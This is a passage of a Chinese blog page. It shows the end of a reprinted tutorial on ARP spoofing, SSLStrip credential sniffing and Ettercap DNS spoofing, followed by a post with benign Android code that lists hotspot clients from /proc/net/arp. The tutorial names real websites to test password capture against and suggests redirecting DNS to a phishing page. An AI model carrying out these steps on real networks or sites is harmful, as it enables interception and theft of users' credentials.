+<p>点击view——connections查看被攻击机访问的IP，端口，协议，发送和接收的数据包大小。</p>
+<p>点击view——profiles查看被攻击机访问的链接。在下方可以查看更清晰的链接访问情况。</p>
+<p>当然你也可以通过双击链接来查看profiles details，即访问网站的具体情况。</p>
+<p>在这里，如果被攻击机输入密码登陆某一网站，我们可以检测到登陆的用户名及其密码。</p>
+<p>这是刚刚检测到的一个用户名和登陆密码。这个网站完全没有对密码进行加密操作，出来的结果也是明文显示的。</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/5.png" alt="image"></p>
+<p>这是另外一个站检测出来的，对密码进行了加密。</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/6.png" alt="image"></p>
+<p>Tips：其实一个网站如果使用的都是https协议，那么安全性一般做的比较好，数据进行了加密的，也就是说你即使已经把https降低为http，即使捕获到了密码，你也不可能轻易解密的出来。</p>
+</blockquote>
+<h4><span id="测试网址">测试网址</span></h4><blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://www.freemojo.com</span><br><span class="line">//http密码明文未加密</span><br><span class="line">http://bbs.ylnet.com.cn/forum.php</span><br><span class="line">//http密码加密了</span><br><span class="line">http://www.discuz.net/forum.php</span><br><span class="line">//https密码未加密</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="dns欺骗">DNS欺骗</span></h3><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure>
+
+<p>在微软处添加：</p>
+<p>&#96;<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> A 192.168.40.132</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/7.png" alt="image"></p>
+<p>ettercap -G（进入图形界面）</p>
+<p>重复之前的步骤ARP欺骗的步骤，在start sniffing之前添加一个插件</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/8.png" alt="image"></p>
+<p>双击启动dns_spoof</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/9.png" alt="image"></p>
+<p>开始嗅探后，我们在目标机中ping一下百度</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/10.png" alt="image"></p>
+<p>欺骗成功，如果将192.168.40.132改为钓鱼页面，就可以欺骗到用户账号密码</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/11.png" alt="image"></p>
+<p>最后提醒大家，连接公共wifi时一定要小心！</p>
+</blockquote>
+<h2><span id="参考资料">参考资料</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/983d43b4ba1e">如何进行一次完整的 SSLStrip</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/paperpen/p/10810690.html">ARP欺骗之ettercap图形化界面</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bbf50dace855">APR攻击（Arpspoof）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/li_101357/article/details/78416813">linux ip 转发设置 ip_forward、ip_forward与路由转发</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/kuiguowei/article/details/79070945">HTTP&amp;HTTPS账号密码获取与ettercap局域网内DNS欺骗</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bingyublog.com/2018/02/23/%E4%BD%BF%E7%94%A8ssltrip%E7%AA%81%E7%A0%B4ssl%E5%8A%A0%E5%AF%86%E6%88%AA%E8%8E%B7%E5%AF%86%E7%A0%81/">使用ssltrip突破ssl加密截获密码</a></p>
+<p><a target="_blank" rel="noopener" href="https://moxie.org/software/sslstrip/">sslstrip</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/5929.html">利用sslstrip和ettercap突破ssl嗅探密码</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.linuxde.net/2011/11/2522.html">针对SSL的中间人攻击演示和防范</a></p>
+<p><a target="_blank" rel="noopener" href="https://tools.kali.org/information-gathering/sslstrip">sslstrip Package Description</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/ARP/" rel="tag">ARP</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WiFi/" rel="tag">WiFi</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/02/Android-WIFI/">
+                Android 开启个人热点时 获取连接人数以及连接上的设备信息
+            </a>
+        </h2>
+    
+    <time>
+        Sep 2, 2023
+    </time>
+    <section class="content">
+        <h1><span id="android-开启个人热点时-获取连接人数以及连接上的设备信息">Android 开启个人热点时 获取连接人数以及连接上的设备信息</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/king4148/article/details/70156760">多看一二</a> 并作补充</p>
+</blockquote>
+<h2><span id="起因">起因</span></h2><blockquote>
+<p>最近在开发过程当中，遇到一个需求 ，开启个人热点后需要知道有多少人连上了这个热点 以及这些设备的信息</p>
+<p>经过一段时间的摸索和反复的查阅资料，有了下面的代码和解决办法：</p>
+<p>首先 连接热点的所有信息都保存在proc&#x2F;net&#x2F;arp下面 用re文件管理器可以查看一下</p>
+<p>会发现 里面有连接的设备的 ip mac地址 等等  </p>
+<p>好了 那么问题就简单了</p>
+<p>直接贴代码：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">ArrayList&lt;ClientScanResult&gt; result = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;/proc/net/arp&quot;</span>));<span class="comment">//读取这个文件</span></span><br><span class="line">    String ss=br.toString();</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        String[] splitted = line.split(<span class="string">&quot; +&quot;</span>);<span class="comment">//将文件里面的字段分割开来</span></span><br><span class="line">        <span class="keyword">if</span> (splitted.length &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="comment">// Basic sanity check</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">mac</span> <span class="operator">=</span> splitted[<span class="number">3</span>];<span class="comment">// 文件中分别是IP address  HW type Flags HW address mask Device </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//然后我们拿取HW address  也就是手机的mac地址进行匹配  如果有 就证明是手机</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mac.matches(<span class="string">&quot;..:..:..:..:..:..&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isReachable</span> <span class="operator">=</span> InetAddress.getByName(splitted[<span class="number">0</span>]).isReachable(reachableTimeout);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!onlyReachables || isReachable) &#123;</span><br><span class="line"></span><br><span class="line">                    result.add(<span class="keyword">new</span> <span class="title class_">ClientScanResult</span>(splitted[<span class="number">0</span>], splitted[<span class="number">3</span>], splitted[<span class="number">5</span>], isReachable));<span class="comment">//最后如果能匹配 那就证明是连接了热点的手机  加到这个集合里 里面有所有需要的信息</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    CandyLog.e(e.getMessage());</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (br != <span class="literal">null</span>) &#123;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        CandyLog.e(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientScanResult</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String IpAddr;</span><br><span class="line">    <span class="keyword">private</span> String HWAddr;</span><br><span class="line">    <span class="keyword">private</span> String Device;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> isReachable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClientScanResult</span><span class="params">(String ipAddr, String hWAddr, String device, <span class="type">boolean</span> isReachable)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.IpAddr = ipAddr;</span><br><span class="line">        <span class="built_in">this</span>.HWAddr = hWAddr;</span><br><span class="line">        <span class="built_in">this</span>.Device = device;</span><br><span class="line">        <span class="built_in">this</span>.isReachable = isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getIpAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> IpAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIpAddr</span><span class="params">(String ipAddr)</span> &#123;</span><br><span class="line">        IpAddr = ipAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHWAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> HWAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHWAddr</span><span class="params">(String hWAddr)</span> &#123;</span><br><span class="line">        HWAddr = hWAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDevice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Device;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDevice</span><span class="params">(String device)</span> &#123;</span><br><span class="line">        Device = device;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isReachable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setReachable</span><span class="params">(<span class="type">boolean</span> isReachable)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.isReachable = isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>好了 想要知道连接人数  只要得到集合的size就可以了  又解决一个问题</p>
+<p>关键点在于 热点信息储存在proc&#x2F;net&#x2F;arp 里面  有兴趣的可以了解下proc目录 里面有很多很多信息</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WiFi/" rel="tag">WiFi</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+</section>
+
+
+        <script>setLoadingBarProgress(60);</script>
+    </main>
+
+    <footer id="footer" class="clearfix">
+
+    
+
+    <div class="social-wrapper">
+        
+            
+                <a href="https://github.com/szczecin" class="social github"
+                   target="_blank" rel="external">
+                    <span class="icon icon-github"></span>
+                </a>
+            
+                <a href="/atom.xml" class="social rss"
+                   target="_blank" rel="external">
+                    <span class="icon icon-rss"></span>
+                </a>
+            
+        
+    </div>
+
+    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
+                                                                                    target="_blank">Art Chen</a>.
+    </div>
+    <div>&copy; <a href="/">氕氘氚</a></div>
+
+</footer>
+
+
+    <script>setLoadingBarProgress(80);</script>
+    <div class="overlay"></div>
+</div>
+
+<div class="site-sidebar" id="site-sidebar">
+
+    
+
+    <div class="sidebar-switch clearfix "
+         style="display: none">
+        <a class="dark-btn active" data-toggle="toc">
+            <span class="icon icon-list"></span>
+            <span class="text">Index</span>
+        </a>
+        <a class="dark-btn" data-toggle="bio">
+            <span class="icon icon-person"></span>
+            <span class="text">Bio</span>
+        </a>
+    </div>
+
+    <div class="site-toc "
+         style="display: none">
+        
+            <div class="no-index">No Index</div>
+        
+    </div>
+
+    <div class="site-bio show"
+         style="display: block">
+
+        <div class="about-me clearfix">
+            <div class="avatar">
+                <img src="/img/avatar.png"/>
+            </div>
+            <div class="info">
+                <a class="name dark-btn" href="/about">
+                    Szczecin
+                </a>
+            </div>
+            <div class="info">
+                <span class="item desc">
+                    Open your eyes to see the light in life
+                </span>
+            </div>
+        </div>
+
+        <div class="menu section">
+            <ul class="clearfix">
+                
+                    <li class="left">
+                        <a href="/about"
+                           onfocus="this.blur();"
+                           class="nav-about dark-btn block">
+                            简介
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/archives"
+                           onfocus="this.blur();"
+                           class="nav-archives dark-btn block">
+                            归档
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/categories"
+                           onfocus="this.blur();"
+                           class="nav-categories dark-btn block">
+                            分类
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/tags"
+                           onfocus="this.blur();"
+                           class="nav-tags dark-btn block">
+                            TAGs
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/WriteUP"
+                           onfocus="this.blur();"
+                           class="nav-WriteUP dark-btn block">
+                            WriteUP
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/EXP"
+                           onfocus="this.blur();"
+                           class="nav-EXP dark-btn block">
+                            EXP
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/tags/SRC"
+                           onfocus="this.blur();"
+                           class="nav-SRC dark-btn block">
+                            SRC
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/Life"
+                           onfocus="this.blur();"
+                           class="nav-Life dark-btn block">
+                            Life
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+
+    </div>
+
+    <div class="shortcuts">
+        <a href="#header" class="top window-nav dark-btn" id="go-top">
+            <span class="icon icon-chevron-thin-up"></span>
+        </a>
+        <a class="close dark-btn" id="sidebar-close">
+            <span class="icon icon-close"></span>
+        </a>
+        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+            <span class="icon icon-chevron-thin-down"></span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>
+
+
+<script src="/js/jquery.fitvids.js"></script>
+
+<script>
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var SEARCH_SERVICE = "";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="/js/app.js"></script>
+
+
+<script src="/js/search.js"></script>
+
+
+
+
+
+<script>setLoadingBarProgress(100);</script>
+
+</body>
+</html>
